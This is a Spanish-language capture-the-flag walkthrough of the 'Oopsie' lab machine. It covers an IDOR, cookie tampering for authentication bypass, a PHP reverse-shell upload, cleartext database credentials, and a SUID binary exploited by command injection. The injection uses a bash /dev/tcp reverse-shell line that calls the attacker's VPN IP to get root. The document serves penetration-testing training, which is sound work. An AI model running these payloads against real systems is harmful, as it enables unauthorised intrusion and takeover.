--------
- Tags: #Reconnaisance #PHP #CustomApplications #Apache #WebSiteStructureDiscovery #CookieManipulation #SUIDExploitation #Authenticationbypass #cleartextcredentials #ArbitraryFileUpload #IDOR #PathHijacking
-----------

![](../img/772ae9946d61be629884c47e58d52799.png)

![](../img/21f569c0788994f6a2faa024c0955b8f.png)

La maquina nos empieza preguntando:

![](../img/ee4b2c7c677ab3383e45afcbe52dcbaa.png)

**Respuesta:** `proxy`

✅ Herramientas como **Burp Suite** o **OWASP ZAP** permiten interceptar y modificar tráfico HTTP/HTTPS. Son esenciales en el análisis de aplicaciones web para detectar:

- Peticiones ocultas
    
- Manipulación de cookies
    
- Bypass de autenticación
    
- Fuzzing de formularios
    

**📌 Justificación:**  
Usaremos un proxy para inspeccionar cómo se comporta la aplicación y buscar credenciales, rutas ocultas o parámetros manipulables.


![](../img/f324ef9ac3a0600b06cf460a2312c981.png)

## 🧠 Enumeración inicial y descubrimiento de servicios

### 🔍 Escaneo con Nmap

Realizamos un escaneo de los 1000 puertos más comunes sobre la IP objetivo:

![](../img/f9ad34af6cfaa6b8de2127ae29019cbc.png)

Y vemos que están abiertos tanto SSH como HTTP.


### 🌐 Navegación inicial al sitio web

Accedemos desde el navegador a `http://10.129.66.30`:

![](../img/d26076b22277ce16259c65c59d13fa0e.png)

## 🧰 Interceptando tráfico HTTP con BurpSuite

Configuramos **FoxyProxy** en el navegador apuntando a `127.0.0.1:8080` para interceptar peticiones con BurpSuite.

- Abrimos Burp Suite.
    
- Activamos FoxyProxy (en el navegador: configuramos el proxy en `127.0.0.1:8080`).
    
- Navega por la IP `http://10.129.66.30/`.
    
- Vamos a "Proxy" y activamos "Intercept On"  <-> A la vez que lo volvemos a apagar (Off) y vamos a HTTP History


Navegamos la web y observamos las rutas que aparecen:

![](../img/d99a398f1642b6d6c6a63c3103b5dc3c.png)

Vemos en el `Site map` la ruta `/cdn-cgi/login/script.js`, lo cual nos da pistas sobre una posible sección de login.

![](../img/29ef5efc18b5971cd02ff1f8853b06be.png)

La respuesta del servidor indica un `200 OK` para esa ruta. Por tanto:

📌 **Ruta de login identificada:** `/cdn-cgi/login`

![](../img/2abacbb0ae3f603ea86af2e8569338db.png)

Bien. En la siguiente tarea nos dicen:

¿Qué se puede modificar en Firefox para acceder a la página de subida?

**Respuesta esperada:** un parámetro que el servidor revisa para conceder o no acceso a ciertas rutas. Generalmente, esto se hace mediante **cookies**.

![](../img/f6e7e4f8268aba146b297ab49b88183c.png)

## 🕵️‍♂️ Inspección de cookies

Accedemos a `/cdn-cgi/login` con Firefox + Burp activo e inspeccionamos las cookies.


![](../img/7b0fa9ea448dfb5c0439713c98e5d906.png)

Nos logueamos como **guest**.

## 🛠️ Manipulación de parámetros y acceso a cuentas

Desde el panel como guest, identificamos que la URL cambia por ID:

```bash
http://10.129.108.161/cdn-cgi/login/admin.php?content=accounts&id=2
```


![](../img/6577b742a29fccd9e110aba5e0de681c.png)

Tenemos este usuario y access id.

![](../img/1815cd720cb2d88a0013989d63b62190.png)

Si cambiamos `id=2` por `id=1`, accedemos a la cuenta del **admin**:

```bash
http://10.129.108.161/cdn-cgi/login/admin.php?content=accounts&id=1
```

![](../img/f92daefc34d20f5877778ea0a4afded1.png)

📌 **Access ID del admin:** `34322`

## 🍪 Modificación de cookies para escalar privilegios

Desde las herramientas de desarrollo (F12), cambiamos la cookie `user=2233` a `user=34322`, manteniendo `role=guest`.

![](../img/ae2a3c5d75be4d7815e2fd72e3354d98.png)

Al refrescar la página y acceder a la sección `Uploads`:

```bash
http://10.129.108.161/cdn-cgi/login/admin.php?content=uploads
```

![](../img/b6f8779c11a606f0d8e0e96f0b7f74a0.png)

¡Accedemos con privilegios suficientes!

## 💣 Subida de reverse shell y ejecución remota

Seleccionamos el archivo `php-reverse-shell.php` ubicado en:

![](../img/7528fb201f0ff8df422506781e1fe576.png)

Lo copiamos a un directorio accesible y lo editamos, cambiando IP (VPN) y puerto que queramos:

![](../img/1f3e47f7c25517abf5226a0f3c6356e8.png)

Subimos el archivo mediante el formulario web:

![](../img/359248dd9339057dcf18ede9028ccf7e.png)

Confirmación de subida:

![](../img/a2bf44cc5d2d68de675e0fd99dfb6f7b.png)

Comprobamos la ubicación accediendo a `/uploads/`:

![](../img/d2b540f6a6400b43c06d1b66f13b2e8b.png)

El funcionamiento de subir el reverse shell.php y ponernos en escucha, ha de ser relativamente "rápido" (la ultima imagen era para comprobar que todo funciona bien)

Entonces, volvemos a subir el shell.php, (seguramente tengamos que abrir el puerto indicado, en este caso hemos cambiado el 443 por el 4444)

Nos aseguramos de permitir el puerto de escucha:

![](../img/ed0aa94f0655317deb4139c091591d8c.png)


Y a la vez que entramos en el enlace  (hemos cambiado el nombre del archivo por rev.php)

```bash
http://10.129.240.130/uploads/rev.php
```

![](../img/7de93d567e1b0d96057cef0bb58ec4b6.png)

Lanzamos el listener antes de entrar al archivo desde la url, y tendremos shell !

![](../img/814f4209650ac6f0956c7ed46a92eb16.png)

En las tareas (como bien hemos hecho anteriormente):

Task3: Hemos modificado la cookie para engañar a que somos admin
Task4: El user id de admin era 34322
Task5: La url para subir archivos era /uploads

![](../img/d88ca88b7ebe37fb58c8a43ee6ab914d.png)

## 🔐 Recuperación de credenciales

Buscamos la contraseña de `robert`. Inspeccionamos el archivo `db.php` en la ruta:

![](../img/52a4f46d665c7ca01881106b06e916ca.png)

```bash
/var/www/html/cdn-cgi/login/db.php
```

![](../img/620fa30929ca04c1aada3a7a07856f35.png)

📌 Contraseña encontrada: `M3g4C0rpuUs3r!`


## 🔍 Enumeración local por grupo `bugtracker`


![](../img/0080a8306a579ddd134c35ac46cb7427.png)

## 🧠 ¿Por qué?

El comando `find` permite buscar archivos con múltiples criterios, incluyendo **el grupo propietario** con la opción `-group`.

### Ejemplo de tarea:

```bash
find / -group bugtracker 2>/dev/null
```

*Nos permite encontrar archivos que pertenecen a dicho grupo.*


## 🔑 Recuerda:

- `find` → busca archivos
    
- `-group` → busca por grupo
    
- `bugtracker` → el nombre del grupo
    
- Por eso: **find** es el ejecutable que buscan.


## 👑 Escalada de privilegios con SUID

Si encontramos un ejecutable con **SUID** activado y propiedad de `root`, al ejecutarlo se ejecuta **con privilegios de root**, sin importar **quién** lo ejecute.

✅ Por eso la respuesta correcta es:

![](../img/5c400976644cfc2ed9560b52c8316d56.png)

🎯 ¡Acceso root conseguido!

Para la siguiente tendremos que saber:

Entonces la forma **aceptada por la plataforma** en esta tarea es:

![](../img/f256bdab67b2f2d7cee704bf03424ca9.png)

🔹 Aunque en muchos sitios se define SUID como **Set User ID upon Execution**, en este caso, la plataforma esperaba la forma **más literal del acrónimo**.

### ¿Por qué?

- `Set` → acción
    
- `Owner` → el propietario del archivo
    
- `User` → hace referencia al usuario (propietario)
    
- `ID` → identificador
    

Cuando un archivo tiene el bit **SUID** activado, se ejecuta **con los privilegios del propietario del archivo**, no del usuario que lo lanza.

## 👤 Captura de la flag de usuario

## Contexto
- Acceso como: www-data (reverse shell)
- Ruta inicial: /var/www/html/uploads

## Acciones realizadas

Desde la shell como `www-data`, navegamos hasta `/home/robert/`:

```bash
cd /home/robert
cat user.txt
```

📌 **Flag usuario:** `f2c74ee8db7983851ab2a96a44eb7981`

## Motivo de éxito
El archivo tenía permisos de lectura para `otros` (es decir, para www-data).

### 🧩 Escalada de privilegios hasta obtener la **flag de root** en la máquina _Oopsie_

#### 1. 📂 Localización de credenciales ocultas en el código fuente PHP

Desde la reverse shell inicial obtenida como `www-data`, se explora el contenido de `/var/www/html/cdn-cgi/login` y se encuentra el archivo `db.php` , el cual contiene:

```bash 
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
```

Esto revela las **credenciales del usuario `robert`** en texto plano.

#### 2. ⚠️ Problema al usar `su robert`

Al intentar hacer `su robert`, se muestra el error `must be run from a terminal`. Exportar `TERM=xterm` no es suficiente .

#### 3. 🔧 Mejora del entorno de shell interactiva

Para poder usar `su` correctamente, se convierte la shell en una interactiva con:

```bash 
script /dev/null -c bash
``````

Después de ejecutar eso, ya se permite el uso de `su robert`, y se introducen las credenciales descubiertas .

![](../img/05e0b369adfe21db4d3e458c2001c8e0.png)

✅ Acceso conseguido como **usuario robert**.

#### 4. 🔍 Enumeración de privilegios especiales (SUID)

Usando:

```bash 
find / -group bugtracker 2>/dev/null
``````

Se encuentra el binario `/usr/bin/bugtracker` 
Este archivo pertenece al grupo `bugtracker`, del cual `robert` forma parte, y tiene permisos **SUID activados**

```bash 
-rwsr-xr-- 1 root bugtracker 8729 ... /usr/bin/bugtracker
```

Esto significa que **el binario se ejecuta con permisos de `root`**, sin importar qué usuario lo lance.

#### 5. ⚠️ Vulnerabilidad en el uso de `cat` dentro del binario

El binario solicita un ID de bug y luego hace `cat` sobre un archivo con ese nombre, sin sanear la entrada. Esto permite inyección de comandos .

```bash 
/usr/bin/bugtracker
```

#### 6. ⚙️ Inyección para ejecutar reverse shell como root

Se inyecta una reverse shell como payload:

```bash 
;bash -i >& /dev/tcp/10.10.16.20/4444 0>&1
```

Con el listener activo en el puerto 4444 (`nc -nlvp 4444`), se recibe conexión como **root** 

#### 7. 📦 Obtención de la flag de root

Una vez con acceso como root, se navega a `/root/root.txt` y se obtiene la **flag final**

![](../img/14c927afc9e163cdf6f4a2b9d841783d.png)

